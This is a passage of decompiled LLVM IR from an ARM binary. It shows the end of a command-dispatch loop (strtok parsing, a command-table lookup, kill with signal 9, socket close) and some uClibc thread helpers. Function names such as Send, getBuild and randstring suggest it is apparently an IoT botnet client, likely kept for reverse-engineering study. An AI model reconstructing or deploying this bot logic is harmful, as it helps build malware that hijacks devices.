dec_label_pc_1c684:                               ; preds = %dec_label_pc_1c668, %dec_label_pc_1c650.dec_label_pc_1c684_crit_edge
  %v3_1c698.pre-phi = phi i8* [ %.pre37, %dec_label_pc_1c650.dec_label_pc_1c684_crit_edge ], [ %v1_1c678, %dec_label_pc_1c668 ]
  %v2_1c690.pre-phi = phi i32 [ %.pre36, %dec_label_pc_1c650.dec_label_pc_1c684_crit_edge ], [ %v2_1c674, %dec_label_pc_1c668 ]
  store i8 0, i8* %v3_1c698.pre-phi, align 1
  store i32 %storemerge33.in, i32* @r1, align 4
  %v4_1c6ac = call i32 @strcpy(i8* %v3_1c6ac, i32 %storemerge33.in)
  %v1_1c6c0 = add i32 %v2_1c690.pre-phi, 1
  store i32 %v1_1c6c0, i32* @r1, align 4
  %v4_1c6cc = call i32 @strcpy(i8* %storemerge33, i32 %v1_1c6c0)
  %v7_1c75c114 = load i32, i32* bitcast ([4 x i8]** @global_var_45494.1178 to i32*), align 4
  %v2_1c760116 = icmp eq i32 %v7_1c75c114, 0
  br i1 %v2_1c760116, label %dec_label_pc_1c768, label %dec_label_pc_1c6dc

dec_label_pc_1c6dc:                               ; preds = %dec_label_pc_1c684, %dec_label_pc_1c6dc
  %v6_1c75c119 = phi i32* [ %v6_1c75c, %dec_label_pc_1c6dc ], [ bitcast ([4 x i8]** @global_var_45494.1178 to i32*), %dec_label_pc_1c684 ]
  %storemerge21117 = phi i32 [ %v1_1c74c, %dec_label_pc_1c6dc ], [ 0, %dec_label_pc_1c684 ]
  %v7_1c6e4 = load i32, i32* %v6_1c75c119, align 4
  %v2_1c6f8 = inttoptr i32 %v7_1c6e4 to i8*
  %v3_1c6f8 = call i32 @__GI_strcasecmp(i8* %v2_1c6f8, i32 %v2_1c6a0)
  %v3_1c714 = mul i32 %storemerge21117, 8
  %v2_1c71c = add i32 %v3_1c714, add (i32 ptrtoint ([4 x i8]** @global_var_45494.1178 to i32), i32 4)
  %v1_1c720 = inttoptr i32 %v2_1c71c to i32*
  %v2_1c720 = load i32, i32* %v1_1c720, align 4
  store i32 116552, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_1c720)
  %v1_1c74c = add i32 %storemerge21117, 1
  %v4_1c75c = mul i32 %v1_1c74c, 8
  %v5_1c75c = add i32 %v4_1c75c, ptrtoint ([4 x i8]** @global_var_45494.1178 to i32)
  %v6_1c75c = inttoptr i32 %v5_1c75c to i32*
  %v7_1c75c = load i32, i32* %v6_1c75c, align 4
  %v2_1c760 = icmp eq i32 %v7_1c75c, 0
  br i1 %v2_1c760, label %dec_label_pc_1c768, label %dec_label_pc_1c6dc

dec_label_pc_1c768:                               ; preds = %dec_label_pc_1c6dc, %dec_label_pc_1c684
  %v4_1c778 = call i32 @__GI_strcasecmp(i8* %v3_1c6ac, i32 ptrtoint ([6 x i8]* @global_var_3ac10.1180 to i32))
  %v2_1c780 = icmp eq i32 %v4_1c778, 0
  br i1 %v2_1c780, label %dec_label_pc_1c788, label %dec_label_pc_1c7e0

dec_label_pc_1c788:                               ; preds = %dec_label_pc_1c768
  %v2_1c78c = load i32, i32* @global_var_49b34.817, align 4
  %v2_1c790 = icmp eq i32 %v2_1c78c, 0
  br i1 %v2_1c790, label %dec_label_pc_1c7c4, label %dec_label_pc_1c798

dec_label_pc_1c798:                               ; preds = %dec_label_pc_1c788
  %v2_1c7a8 = call i32 @kill(i32 %v2_1c78c, i32 9)
  %v2_1c7b0 = icmp eq i32 %v2_1c7a8, 0
  br i1 %v2_1c7b0, label %dec_label_pc_1c7b8, label %dec_label_pc_1c7c4

dec_label_pc_1c7b8:                               ; preds = %dec_label_pc_1c798
  store i32 0, i32* @global_var_49b34.817, align 4
  br label %dec_label_pc_1c7c4

dec_label_pc_1c7c4:                               ; preds = %dec_label_pc_1c798, %dec_label_pc_1c788, %dec_label_pc_1c7b8
  %v2_1c7c8 = load i32, i32* @global_var_52598.39, align 4
  %v1_1c7d0 = call i32 @close(i32 %v2_1c7c8)
  %v1_1c7d8 = call i32 @sleep(i32 5)
  br label %dec_label_pc_1c1d8

dec_label_pc_1c7e0:                               ; preds = %dec_label_pc_1c768
  store i32 0, i32* @r0, align 4
  %v2_1c7e8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_3ac08.1173 to i32))
  %v2_1c7f8 = icmp eq i32 %v2_1c7e8, 0
  br i1 %v2_1c7f8, label %dec_label_pc_1c238.lr.ph, label %dec_label_pc_1c800

dec_label_pc_1c800:                               ; preds = %dec_label_pc_1c524, %dec_label_pc_1c7e0
  %storemerge33.in = phi i32 [ %v2_1c7e8, %dec_label_pc_1c7e0 ], [ %v2_1c554, %dec_label_pc_1c524 ]
  %storemerge33 = inttoptr i32 %storemerge33.in to i8*
  %v2_1c804 = load i8, i8* %storemerge33, align 1
  %v2_1c808 = icmp eq i8 %v2_1c804, 0
  br i1 %v2_1c808, label %dec_label_pc_1c238.lr.ph, label %dec_label_pc_1c564

dec_label_pc_1c814:                               ; preds = %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %storemerge33, { 6, 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %storemerge33.in, { 7, 3, 2, 4, 1, 0, 6, 5 }
  uselistorder i32* %v6_1c75c, { 1, 0 }
  uselistorder i32 %v1_1c74c, { 1, 0 }
  uselistorder i32 %storemerge21117, { 1, 0 }
  uselistorder i32 %.pre36, { 1, 0 }
  uselistorder i32 %storemerge20, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge23, { 2, 1, 0, 3 }
  uselistorder i32 %v2_1c4a8, { 2, 1, 0 }
  uselistorder i32 %v1_1c44c, { 1, 0 }
  uselistorder i32 %v3_1c418, { 1, 0 }
  uselistorder i32 %storemerge18100, { 1, 0 }
  uselistorder i32 %v1_1c3fc, { 1, 0 }
  uselistorder i32 %v2_1c3c8, { 1, 0 }
  uselistorder i32 %v2_1c3b8, { 1, 0 }
  uselistorder i32 %v1_1c350, { 0, 2, 1 }
  uselistorder i32 %v2_1c3c889, { 1, 0 }
  uselistorder i32 %v3_1c3c488, { 1, 0 }
  uselistorder i32 %.pre131, { 1, 4, 0, 3, 2 }
  uselistorder i32 %storemerge16113, { 1, 0 }
  uselistorder i32 %v2_1c264, { 1, 0 }
  uselistorder i32 %storemerge1528, { 1, 0 }
  uselistorder i32 %v2_1c5ec, { 1, 0 }
  uselistorder i32 %v2_1c4f8, { 1, 0, 2 }
  uselistorder i32 %v2_1c224, { 1, 0 }
  uselistorder i32 %storemerge14, { 2, 0, 1 }
  uselistorder i32 %v3_1c03c, { 1, 0, 2 }
  uselistorder i32 %v2_1bfa8, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-68.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8*** %stack_var_-6752, { 4, 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-1624, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @sleep, { 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* @global_var_49b34.817, { 0, 5, 6, 1, 7, 8, 9, 2, 10, 11, 12, 3, 4 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_45494.1178 to i32), { 1, 0 }
  uselistorder [4 x i8]** @global_var_45494.1178, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 10, 9, 1, 0, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @recv, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_53718.45, { 1, 4, 5, 6, 0, 7, 8, 9, 2, 10, 11, 3, 12, 13 }
  uselistorder i32* @global_var_49b48.43, { 9, 10, 1, 6, 11, 12, 2, 0, 13, 3, 14, 4, 7, 15, 16, 5, 8, 17 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 9, 8, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @Send, { 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 171, 170, 169, 168, 167, 166, 65, 64, 13, 12, 11, 10, 9, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @getBuild, { 1, 0 }
  uselistorder i32* @global_var_52598.39, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1, 14, 15, 16, 17, 18 }
  uselistorder i32* @global_var_526c0.908, { 0, 1, 5, 2, 6, 7, 8, 3, 4 }
  uselistorder i32* @global_var_52594.89, { 0, 1, 5, 6, 2, 7, 8, 9, 10, 11, 3, 4 }
  uselistorder i32 (i32)* @randstring, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @realrand, { 32, 31, 30, 29, 28, 0, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32)* @srand, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 19, 20, 21, 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 23, 10, 11, 12, 13, 14, 15, 16, 17, 18, 24, 25, 26, 27, 28, 71, 72, 73, 74, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 76, 70, 75 }
  uselistorder i32 (i16*)* @feof, { 10, 11, 9, 12, 8, 13, 7, 14, 6, 15, 5, 16, 4, 17, 3, 18, 2, 19, 1, 20, 0 }
  uselistorder [2 x i8]* @global_var_37118.168, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32), { 14, 7, 13, 6, 5, 12, 4, 11, 3, 10, 2, 9, 1, 8, 0 }
  uselistorder label %dec_label_pc_1c800, { 1, 0 }
  uselistorder label %dec_label_pc_1c7c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c6dc, { 1, 0 }
  uselistorder label %dec_label_pc_1c650, { 1, 0 }
  uselistorder label %dec_label_pc_1c638, { 1, 0 }
  uselistorder label %dec_label_pc_1c594, { 1, 0 }
  uselistorder label %dec_label_pc_1c484, { 1, 0 }
  uselistorder label %dec_label_pc_1c468, { 1, 0 }
  uselistorder label %dec_label_pc_1c414, { 1, 0 }
  uselistorder label %dec_label_pc_1c35c, { 1, 0 }
  uselistorder label %dec_label_pc_1c238, { 1, 0 }
  uselistorder label %dec_label_pc_1c238.lr.ph, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_1c100, { 5, 0, 1, 3, 4, 2 }
  uselistorder label %dec_label_pc_1bf64, { 1, 0 }
  uselistorder label %dec_label_pc_1bef0, { 1, 0 }
}

define i32 @thread_self() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v4_1c898 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 64) to i32*), align 4
  %v1_1c89c = inttoptr i32 %v4_1c898 to i32*
  %v2_1c89c = load i32, i32* %v1_1c89c, align 4
  %v2_1c8a0 = ptrtoint i32* %stack_var_-8 to i32
  %v3_1c8a4 = icmp ult i32 %v2_1c8a0, %v2_1c89c
  br i1 %v3_1c8a4, label %dec_label_pc_1c8b4, label %dec_label_pc_1c8e0

dec_label_pc_1c8b4:                               ; preds = %entry
  %v4_1c8b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 44) to i32*), align 4
  %v1_1c8bc = inttoptr i32 %v4_1c8b8 to i32*
  %v2_1c8bc = load i32, i32* %v1_1c8bc, align 4
  %v3_1c8c0 = icmp ult i32 %v2_1c8a0, %v2_1c8bc
  br i1 %v3_1c8c0, label %dec_label_pc_1c8e8, label %dec_label_pc_1c8c8

dec_label_pc_1c8c8:                               ; preds = %dec_label_pc_1c8b4
  %v4_1c8cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 204) to i32*), align 4
  %v1_1c8d0 = inttoptr i32 %v4_1c8cc to i32*
  %v2_1c8d0 = load i32, i32* %v1_1c8d0, align 4
  %v3_1c8d4 = icmp ult i32 %v2_1c8a0, %v2_1c8d0
  br i1 %v3_1c8d4, label %dec_label_pc_1c8e0, label %dec_label_pc_1c8e8

dec_label_pc_1c8e0:                               ; preds = %dec_label_pc_1c8c8, %entry
  %v1_1c8e0 = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 184), %entry ], [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120), %dec_label_pc_1c8c8 ]
  %v3_1c8e0 = inttoptr i32 %v1_1c8e0 to i32*
  %v4_1c8e0 = load i32, i32* %v3_1c8e0, align 4
  br label %dec_label_pc_1c914

dec_label_pc_1c8e8:                               ; preds = %dec_label_pc_1c8c8, %dec_label_pc_1c8b4
  %v4_1c8ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 112) to i32*), align 4
  %v1_1c8f0 = inttoptr i32 %v4_1c8ec to i32*
  %v2_1c8f0 = load i32, i32* %v1_1c8f0, align 4
  %v2_1c8f4 = icmp eq i32 %v2_1c8f0, 0
  br i1 %v2_1c8f4, label %dec_label_pc_1c904, label %dec_label_pc_1c8fc

dec_label_pc_1c8fc:                               ; preds = %dec_label_pc_1c8e8
  %v0_1c8fc = call i32 @__pthread_find_self()
  br label %dec_label_pc_1c914

dec_label_pc_1c904:                               ; preds = %dec_label_pc_1c8e8
  %v3_1c904 = and i32 %v2_1c8a0, -2097152
  %v4_1c904 = xor i32 %v3_1c904, -2097152
  %v1_1c910 = sub i32 -352, %v4_1c904
  br label %dec_label_pc_1c914

dec_label_pc_1c914:                               ; preds = %dec_label_pc_1c8fc, %dec_label_pc_1c8e0, %dec_label_pc_1c904
  %v1_1c91c = phi i32 [ %v0_1c8fc, %dec_label_pc_1c8fc ], [ %v4_1c8e0, %dec_label_pc_1c8e0 ], [ %v1_1c910, %dec_label_pc_1c904 ]
  ret i32 %v1_1c91c

; uselistorder directives
  uselistorder label %dec_label_pc_1c914, { 2, 0, 1 }
}

define i32 @function_1c924(i16* %arg1) local_unnamed_addr {
dec_label_pc_1c924:
  %v0_1c924 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1c924, label %.thread, label %.thread4

.thread:                                          ; preds = %dec_label_pc_1c924
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_1c924
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @__h_errno_location() local_unnamed_addr {
entry:
  %v0_1c944 = call i32 @thread_self()
  %v1_1c948 = add i32 %v0_1c944, 76
  %v2_1c948 = inttoptr i32 %v1_1c948 to i32*
  %v3_1c948 = load i32, i32* %v2_1c948, align 4
  ret i32 %v3_1c948
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  %v0_1c960 = call i32 @thread_self()
  %v1_1c964 = add i32 %v0_1c960, 68
  %v2_1c964 = inttoptr i32 %v1_1c964 to i32*
  %v3_1c964 = load i32, i32* %v2_1c964, align 4
  ret i32 %v3_1c964
}

define i32 @__pthread_manager_adjust_prio(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1c974 = load i32, i32* @r4, align 4
  store i32 %v3_1c974, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r4.global-to-local, align 4
  %v4_1c984 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120) to i32*), align 4
  %v1_1c988 = add i32 %v4_1c984, 24
  %v2_1c988 = inttoptr i32 %v1_1c988 to i32*
  %v3_1c988 = load i32, i32* %v2_1c988, align 4
  %v0_1c98c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1c98c, i32* %r5.global-to-local, align 4
  %v7_1c998 = icmp sgt i32 %v0_1c98c, %v3_1c988
  br i1 %v7_1c998, label %dec_label_pc_1c99c, label %dec_label_pc_1c9d0

dec_label_pc_1c99c:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1c9a0 = call i32 @sched_get_priority_max(i32 1)
  store i32 %v1_1c9a0, i32* %r0.global-to-local, align 4
  %v0_1c9a8 = load i32, i32* %r5.global-to-local, align 4
  %v0_1c9ac = load i32, i32* %r4.global-to-local, align 4
  %v2_1c9ac = add i32 %v0_1c9ac, 120
  %v3_1c9ac = inttoptr i32 %v2_1c9ac to i32*
  %v4_1c9ac = load i32, i32* %v3_1c9ac, align 4
  store i32 %v4_1c9ac, i32* %r4.global-to-local, align 4
  %v5_1c9b0 = icmp slt i32 %v0_1c9a8, %v1_1c9a0
  %v7_1c9b4 = zext i1 %v5_1c9b0 to i32
  %storemerge = add i32 %v7_1c9b4, %v0_1c9a8
  store i32 %storemerge, i32* %stack_var_-20, align 4
  %v6_1c9bc = ptrtoint i32* %stack_var_-20 to i32
  %v1_1c9c0 = add i32 %v4_1c9ac, 20
  %v2_1c9c0 = inttoptr i32 %v1_1c9c0 to i32*
  %v3_1c9c0 = load i32, i32* %v2_1c9c0, align 4
  store i32 %v3_1c9c0, i32* %r0.global-to-local, align 4
  %v3_1c9c8 = call i32 @sched_setscheduler(i32 %v3_1c9c0, i32 1, i32 %v6_1c9bc)
  store i32 %v3_1c9c8, i32* %r0.global-to-local, align 4
  %v0_1c9cc = load i32, i32* %r5.global-to-local, align 4
  %v1_1c9cc = load i32, i32* %r4.global-to-local, align 4
  %v2_1c9cc = add i32 %v1_1c9cc, 24
  %v3_1c9cc = inttoptr i32 %v2_1c9cc to i32*
  store i32 %v0_1c9cc, i32* %v3_1c9cc, align 4
  %v2_1c9d4.pre = load i32, i32* %stack_var_-12, align 4
  %v1_1c9d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c9d0

dec_label_pc_1c9d0:                               ; preds = %entry, %dec_label_pc_1c99c
  %v1_1c9d8 = phi i32 [ %v0_1c98c, %entry ], [ %v1_1c9d8.pre, %dec_label_pc_1c99c ]
  %v2_1c9d4 = phi i32 [ %v3_1c974, %entry ], [ %v2_1c9d4.pre, %dec_label_pc_1c99c ]
  store i32 %v2_1c9d4, i32* %r4.global-to-local, align 4
  ret i32 %v1_1c9d8

; uselistorder directives
  uselistorder i32 %v0_1c98c, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 6, 5, 0, 1 }
  uselistorder label %dec_label_pc_1c9d0, { 1, 0 }
}

define i32 @__pthread_manager_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r0.global-to-local, align 4
  %v4_1c9f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38348) to i32*), align 4
  %v2_1c9f8 = icmp eq i32 %v4_1c9f4, 0
  br i1 %v2_1c9f8, label %dec_label_pc_1ca08, label %bb

bb:                                               ; preds = %entry
  br label %bb13

dec_label_pc_1ca08:                               ; preds = %entry
  %v4_1ca0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38352) to i32*), align 4
  %v2_1ca10 = icmp eq i32 %v4_1ca0c, 0
  br i1 %v2_1ca10, label %bb13, label %bb12

bb12:                                             ; preds = %dec_label_pc_1ca08
  br label %bb13

bb13:                                             ; preds = %bb, %dec_label_pc_1ca08, %bb12
  %v0_1ca18 = phi i1 [ true, %bb ], [ true, %dec_label_pc_1ca08 ], [ false, %bb12 ]
  store i32 1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38348) to i32*), align 4
  br i1 %v0_1ca18, label %.dec_label_pc_1ca70_crit_edge, label %dec_label_pc_1ca2c

.dec_label_pc_1ca70_crit_edge:                    ; preds = %bb13
  %v1_1ca78.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ca70

dec_label_pc_1ca2c:                               ; preds = %bb13
  store i32 0, i32* %stack_var_-44, align 4
  %v0_1ca40 = load i32, i32* %r0.global-to-local, align 4
  %v2_1ca40 = add i32 %v0_1ca40, 132
  %v3_1ca40 = inttoptr i32 %v2_1ca40 to i32*
  %v4_1ca40 = load i32, i32* %v3_1ca40, align 4
  store i32 %v4_1ca40, i32* @r5, align 4
  %v2_1ca44 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1ca44, i32* @r4, align 4
  br label %dec_label_pc_1ca48

dec_label_pc_1ca48:                               ; preds = %dec_label_pc_1ca60.dec_label_pc_1ca48_crit_edge, %dec_label_pc_1ca2c
  %v0_1ca50 = phi i32 [ %v0_1ca50.pre, %dec_label_pc_1ca60.dec_label_pc_1ca48_crit_edge ], [ %v4_1ca40, %dec_label_pc_1ca2c ]
  %v1_1ca50 = inttoptr i32 %v0_1ca50 to i32*
  %v2_1ca50 = load i32, i32* %v1_1ca50, align 4
  store i32 %v2_1ca50, i32* %r0.global-to-local, align 4
  %v3_1ca54 = call i32 @write(i32 %v2_1ca50, i32 %v2_1ca44, i32 28)
  store i32 %v3_1ca54, i32* %r0.global-to-local, align 4
  %v3_1ca58 = icmp eq i32 %v3_1ca54, -1
  br i1 %v3_1ca58, label %dec_label_pc_1ca60, label %dec_label_pc_1ca70.loopexit

dec_label_pc_1ca60:                               ; preds = %dec_label_pc_1ca48
  %v0_1ca60 = call i32 @__errno_location()
  store i32 %v0_1ca60, i32* %r0.global-to-local, align 4
  %v1_1ca64 = inttoptr i32 %v0_1ca60 to i32*
  %v2_1ca64 = load i32, i32* %v1_1ca64, align 4
  %v7_1ca68 = icmp eq i32 %v2_1ca64, 4
  br i1 %v7_1ca68, label %dec_label_pc_1ca60.dec_label_pc_1ca48_crit_edge, label %dec_label_pc_1ca70.loopexit

dec_label_pc_1ca60.dec_label_pc_1ca48_crit_edge:  ; preds = %dec_label_pc_1ca60
  %v0_1ca50.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ca48

dec_label_pc_1ca70.loopexit:                      ; preds = %dec_label_pc_1ca60, %dec_label_pc_1ca48
  %v1_1ca785 = phi i32 [ %v0_1ca60, %dec_label_pc_1ca60 ], [ %v3_1ca54, %dec_label_pc_1ca48 ]
  br label %dec_label_pc_1ca70

dec_label_pc_1ca70:                               ; preds = %.dec_label_pc_1ca70_crit_edge, %dec_label_pc_1ca70.loopexit
  %v1_1ca78 = phi i32 [ %v1_1ca785, %dec_label_pc_1ca70.loopexit ], [ %v1_1ca78.pre, %.dec_label_pc_1ca70_crit_edge ]
  ret i32 %v1_1ca78

; uselistorder directives
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_1ca70, { 1, 0 }
  uselistorder label %bb13, { 2, 1, 0 }
}

define i32 @pthread_kill_all_threads(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1ca94 = load i32, i32* @r0, align 4
  ret i32 %v2_1ca94
}

define i32 @function_1ca98(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1ca98:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1ca98 = load i32, i32* @r4, align 4
  store i32 %v3_1ca98, i32* %stack_var_-20, align 4
  %v2_1ca9c = add i32 %arg4, %arg3
  %v3_1ca9c = inttoptr i32 %v2_1ca9c to i32*
  %v4_1ca9c = load i32, i32* %v3_1ca9c, align 4
  %v1_1caa0 = inttoptr i32 %v4_1ca9c to i32*
  %v2_1caa0 = load i32, i32* %v1_1caa0, align 4
  %v1_1caa4 = inttoptr i32 %v2_1caa0 to i32*
  %v2_1caa4 = load i32, i32* %v1_1caa4, align 4
  store i32 %v2_1caa4, i32* %r4.global-to-local, align 4
  %v0_1caac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1caac, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %v4_1ca9c, i32* @r7, align 4
  br label %dec_label_pc_1cac8

dec_label_pc_1cabc:                               ; preds = %dec_label_pc_1cac8
  %v1_1cabc = add i32 %v1_1cadc, 20
  %v2_1cabc = inttoptr i32 %v1_1cabc to i32*
  %v3_1cabc = load i32, i32* %v2_1cabc, align 4
  store i32 %v3_1cabc, i32* %r0.global-to-local, align 4
  %v2_1cac0 = call i32 @kill(i32 %v3_1cabc, i32 %v0_1cad0)
  store i32 %v2_1cac0, i32* %r0.global-to-local, align 4
  %v0_1cac4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1cac4 = inttoptr i32 %v0_1cac4 to i32*
  %v2_1cac4 = load i32, i32* %v1_1cac4, align 4
  store i32 %v2_1cac4, i32* %r4.global-to-local, align 4
  %v0_1cac8.pre = load i32, i32* @r7, align 4
  %v0_1cad0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1cac8

dec_label_pc_1cac8:                               ; preds = %dec_label_pc_1ca98, %dec_label_pc_1cabc
  %v0_1cad0 = phi i32 [ %v0_1caac, %dec_label_pc_1ca98 ], [ %v0_1cad0.pre, %dec_label_pc_1cabc ]
  %v1_1cadc = phi i32 [ %v2_1caa4, %dec_label_pc_1ca98 ], [ %v2_1cac4, %dec_label_pc_1cabc ]
  %v0_1cac8 = phi i32 [ %v4_1ca9c, %dec_label_pc_1ca98 ], [ %v0_1cac8.pre, %dec_label_pc_1cabc ]
  %v1_1cac8 = inttoptr i32 %v0_1cac8 to i32*
  %v2_1cac8 = load i32, i32* %v1_1cac8, align 4
  %v9_1cacc = icmp eq i32 %v1_1cadc, %v2_1cac8
  br i1 %v9_1cacc, label %dec_label_pc_1cad8, label %dec_label_pc_1cabc

dec_label_pc_1cad8:                               ; preds = %dec_label_pc_1cac8
  %v0_1cad8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1cad8 = icmp eq i32 %v0_1cad8, 0
  br i1 %v2_1cad8, label %bb10, label %bb

bb:                                               ; preds = %dec_label_pc_1cad8
  %v2_1cadc = add i32 %v1_1cadc, 20
  %v3_1cadc = inttoptr i32 %v2_1cadc to i32*
  %v4_1cadc = load i32, i32* %v3_1cadc, align 4
  store i32 %v4_1cadc, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_1cad8, %bb
  %v1_1cae0 = xor i1 %v2_1cad8, true
  call void @__pseudo_cond_branch(i1 %v1_1cae0, i32 ptrtoint (i32* @global_var_23254.1198 to i32))
  %v2_1cae8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1cae8, i32* %r4.global-to-local, align 4
  %v1_1caec = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1caec

; uselistorder directives
  uselistorder i32 %v1_1cadc, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 5, 3, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_1cac8, { 1, 0 }
}

define i32 @pthread_start_thread(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_1caf8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r4, align 4
  %v0_1cb00 = call i32 @__GI_getpid()
  %v0_1cb04 = load i32, i32* @r4, align 4
  %v1_1cb04 = add i32 %v0_1cb04, 100
  %v2_1cb08 = add i32 %v0_1cb04, 20
  %v3_1cb08 = inttoptr i32 %v2_1cb08 to i32*
  store i32 %v0_1cb00, i32* %v3_1cb08, align 4
